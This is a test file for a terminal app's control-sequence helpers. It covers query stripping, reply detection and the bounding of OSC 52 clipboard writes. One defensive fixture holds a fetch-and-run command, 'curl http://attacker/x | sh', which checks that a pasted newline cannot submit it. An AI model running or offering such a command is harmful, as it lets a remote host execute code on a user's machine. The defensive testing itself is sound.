import { beforeEach, describe, expect, it } from "vitest";
import {
  OSC52_MAX_CHARS,
  claimInitialInput,
  clearClaimedInitialInputsForTest,
  decodeOsc52Clipboard,
  initialInputForPty,
  isTerminalIdentityResponse,
  isTerminalReport,
  stripTerminalQueries,
} from "../lib/terminalControl";

describe("terminal control helpers", () => {
  beforeEach(() => {
    clearClaimedInitialInputsForTest();
  });

  it("detects xterm identity replies that must not become shell input", () => {
    expect(isTerminalIdentityResponse("\x1b[>0;276;0c")).toBe(true);
    expect(isTerminalIdentityResponse("\x1b[?1;2c")).toBe(true);
    expect(isTerminalIdentityResponse("\x1b[>0;276;0c\x1b[?1;2c")).toBe(true);
  });

  it("does not classify ordinary command text as a terminal identity reply", () => {
    expect(isTerminalIdentityResponse("PATH=/usr/bin:$PATH bash 'install.sh'")).toBe(false);
    expect(isTerminalIdentityResponse("0;276;0cPATH=/usr/bin:$PATH bash 'install.sh'")).toBe(false);
  });

  it("clears shell readline before auto-typing commands", () => {
    expect(initialInputForPty("bash 'install.sh'", "shell")).toBe("\x15bash 'install.sh'");
    expect(initialInputForPty("/hooks", "agent")).toBe("/hooks");
  });

  it("claims a given initial input only once per PTY id", () => {
    expect(claimInitialInput("p:shell-1", "bash 'install.sh'")).toBe(true);
    expect(claimInitialInput("p:shell-1", "bash 'install.sh'")).toBe(false);
    expect(claimInitialInput("p:shell-2", "bash 'install.sh'")).toBe(true);
    expect(claimInitialInput("p:shell-1", "bash 'other.sh'")).toBe(true);
  });
});

describe("replayed output can no longer answer a query on the user's behalf", () => {
  it("strips the probes tmux/vim send on attach — the `0;276;0c` bug", () => {
    // tmux's attach burst: primary + secondary DA, XTVERSION, background colour.
    const burst = "\x1b[c\x1b[>c\x1b[>0q\x1b]11;?\x07";
    expect(stripTerminalQueries(`hello${burst}world`)).toBe("helloworld");
    expect(stripTerminalQueries("\x1b[5n\x1b[6n\x1b[?6n")).toBe("");
    expect(stripTerminalQueries("\x1b[?2026$p")).toBe("");
    expect(stripTerminalQueries("\x1bP$qm\x1b\\")).toBe("");
  });

  it("leaves everything that draws alone", () => {
    const frame = "\x1b[2J\x1b[1;1H\x1b[31mred\x1b[0m\r\n\x1b]0;a title\x07$ ls\r\n";
    expect(stripTerminalQueries(frame)).toBe(frame);
    // A cursor-style set ends in `q` too, but is not a query.
    expect(stripTerminalQueries("\x1b[5 q")).toBe("\x1b[5 q");
    // Plain output never even runs the regex.
    expect(stripTerminalQueries("total 4\r\n")).toBe("total 4\r\n");
  });

  it("recognizes the replies to those probes, and no keystroke", () => {
    expect(isTerminalReport("\x1b[>0;276;0c")).toBe(true);
    expect(isTerminalReport("\x1b[?1;2c")).toBe(true);
    expect(isTerminalReport("\x1b[24;1R")).toBe(true);
    expect(isTerminalReport("\x1b[0n")).toBe(true);
    expect(isTerminalReport("\x1b[?2026;2$y")).toBe(true);
    expect(isTerminalReport("\x1b]11;rgb:1e1e/1e1e/1e1e\x07")).toBe(true);
    expect(isTerminalReport("\x1bP1$r0m\x1b\\")).toBe(true);
    // Real user input, including the keys that come closest.
    expect(isTerminalReport("ls -la")).toBe(false);
    expect(isTerminalReport("\r")).toBe(false);
    expect(isTerminalReport("\x1b[A")).toBe(false); // arrow up
    expect(isTerminalReport("\x1bOR")).toBe(false); // F3 — SS3, not CSI
    expect(isTerminalReport("\x1b")).toBe(false); // Escape
  });
});

/** OSC 52 payload: `Pc ; <base64>`. */
const osc52 = (text: string, pc = "c") => `${pc};${btoa(text)}`;

describe("OSC 52 clipboard writes are bounded, not trusted", () => {
  it("accepts an ordinary clipboard write on the clipboard registers", () => {
    expect(decodeOsc52Clipboard(osc52("git log --oneline"))).toBe("git log --oneline");
    // "" is the spec default (also the clipboard); "cp"/"cs" include it.
    expect(decodeOsc52Clipboard(osc52("hello", ""))).toBe("hello");
    expect(decodeOsc52Clipboard(osc52("hello", "cp"))).toBe("hello");
  });

  it("strips newlines — the byte that turns a paste into an executed command", () => {
    // The headline attack: a payload whose own newline submits it the moment the
    // user pastes into a shell or a sudo prompt.
    expect(decodeOsc52Clipboard(osc52("curl http://attacker/x | sh\n"))).toBe(
      "curl http://attacker/x | sh ",
    );
    expect(decodeOsc52Clipboard(osc52("a\r\nb\nc"))).toBe("a b c");
    expect(decodeOsc52Clipboard(osc52("\n\n"))).toBe(" ");
  });

  it("caps the payload length", () => {
    const long = "x".repeat(OSC52_MAX_CHARS + 500);
    expect(decodeOsc52Clipboard(osc52(long))!.length).toBe(OSC52_MAX_CHARS);
  });

  it("refuses a read-back query, a non-clipboard register, and a malformed payload", () => {
    // `Pc;?` would let any program read whatever the user last copied.
    expect(decodeOsc52Clipboard("c;?")).toBeNull();
    // Primary-selection-only is not Eldrun's one clipboard.
    expect(decodeOsc52Clipboard(osc52("hello", "p"))).toBeNull();
    expect(decodeOsc52Clipboard("c")).toBeNull();
    expect(decodeOsc52Clipboard("c;!!!not-base64!!!")).toBeNull();
    // Nothing left after stripping → nothing to set.
    expect(decodeOsc52Clipboard(osc52(""))).toBeNull();
  });
});
